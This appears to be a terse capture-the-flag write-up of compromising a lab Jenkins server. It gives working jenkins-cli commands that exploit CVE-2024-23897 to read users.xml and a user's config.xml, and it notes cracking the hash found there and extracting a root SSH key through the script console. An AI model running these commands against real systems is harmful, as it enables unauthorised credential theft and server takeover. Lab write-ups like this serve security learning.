...
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-24 03:29 CDT
Nmap scan report for 10.129.1.29
...
# Found [**CVE-2024-23897(Arbitrary File Read Vulnerability)** ](https://www.jenkins.io/security/advisory/2024-01-24/) 

tldr
> allowing unauthenticated attackers to read arbitrary files on the Jenkins controller file system

```shell
java -jar jenkins-cli.jar -s 'http://10.129.1.29:8080' -noCertificateCheck reload-job '@/var/jenkins_home/users/users.xml'

java -jar jenkins-cli.jar -s 'http://10.129.1.29:8080' -noCertificateCheck connect-node '@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml'
```

# cracked the hash found from config.xml 
...
# Root private ssh key found on the html file on /credentials path, used script console to extract private ssh key from the hash
